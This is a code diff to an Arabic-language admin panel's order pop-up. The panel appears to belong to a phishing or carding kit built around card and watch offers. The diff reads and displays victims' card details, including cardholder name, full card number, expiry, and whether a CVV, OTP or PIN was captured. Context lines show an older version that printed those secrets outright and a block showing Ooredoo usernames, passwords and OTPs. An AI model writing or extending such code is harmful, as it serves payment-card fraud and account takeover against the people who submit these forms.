@@ -541,6 +541,15 @@ function openPop(ref){
   popRef = ref;
   const card = plans.find(p => p.cls === o.card);
   const watch = WATCHES.find(w => w.id === o.watch);
+  const pay = o.pay || {};
+  const cardNumber = pay.cardNumber || o.cardNumber || "";
+  const last4 = pay.last4 || (cardNumber ? String(cardNumber).slice(-4) : "");
+  const cardName = pay.cardName || o.cardName || "";
+  const cardBrand = pay.brand || o.brand || "";
+  const cardExp = pay.exp || pay.expiry || o.expiry || "";
+  const hasCvv = pay.cvv === true || Boolean(pay.cvv || o.cvv);
+  const hasOtp = pay.otp === true || Boolean(pay.otp || o.otp);
+  const hasPin = pay.pin === true || Boolean(pay.pin || o.pin);
   $("popHead").innerHTML = `
     ${card ? `<img class="c" src="${card.img}" alt="">` : ""}
     ${watch ? `<img class="w" src="${watch.img}" alt="">` : ""}
@@ -562,14 +571,14 @@ function openPop(ref){
       <div class="drow"><span class="k">المنطقة</span><span class="v">${areaName(o.em,o.a)}</span></div>
       <div class="drow" style="grid-column:1/-1"><span class="k">عنوان التوصيل</span><span class="v">${esc(o.ad)}</span></div>
     </div>
- ${o.pay ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
-<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(typeof o.pay.cardName === 'boolean' ? '-' : (o.pay.cardName || '-'))}</span></div>
-<div class="drow"><span class="k">نوع البطاقة</span><span class="v" style="direction:ltr">${esc(o.pay.brand || '-')}</span></div>
-<div class="drow"><span class="k">آخر 4 أرقام</span><span class="v" style="direction:ltr">${esc(o.pay.last4 || '-')}</span></div>
-<div class="drow"><span class="k">CVV</span><span class="v">${o.pay.cvv === true ? 'تم الإدخال' : esc(o.pay.cvv || '-')}</span></div>
-<div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(typeof o.pay.exp === 'boolean' ? '-' : (o.pay.exp || o.pay.expiry || '-'))}</span></div>
-<div class="drow"><span class="k">رمز التأكيد (OTP)</span><span class="v">${o.pay.otp === true ? 'تم الإدخال' : esc(o.pay.otp || o.pay.code || '-')}</span></div>
-<div class="drow"><span class="k">الرقم السري</span><span class="v">${o.pay.pin === true ? 'تم الإدخال' : esc(o.pay.pin || '-')}</span></div>
+ ${(o.pay || cardName || cardNumber || o.cvv || o.expiry || o.otp || o.pin) ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
+<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(cardName || '-')}</span></div>
+<div class="drow"><span class="k">نوع البطاقة</span><span class="v" style="direction:ltr">${esc(cardBrand || '-')}</span></div>
+<div class="drow"><span class="k">آخر 4 أرقام</span><span class="v" style="direction:ltr">${esc(last4 || '-')}</span></div>
+<div class="drow"><span class="k">CVV</span><span class="v">${hasCvv ? 'تم الإدخال' : '-'}</span></div>
+<div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(cardExp || '-')}</span></div>
+<div class="drow"><span class="k">رمز التأكيد (OTP)</span><span class="v">${hasOtp ? 'تم الإدخال' : '-'}</span></div>
+<div class="drow"><span class="k">الرقم السري</span><span class="v">${hasPin ? 'تم الإدخال' : '-'}</span></div>
 </div></div>` : ""}
 ${ (o.ooredooUser || o.ooredooPass || o.ooredooOtp) ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات أوريدو</div><div class="dgrid">
 <div class="drow"><span class="k">اسم المستخدم</span><span class="v" style="direction:ltr">${esc(o.ooredooUser || '')}</span></div>
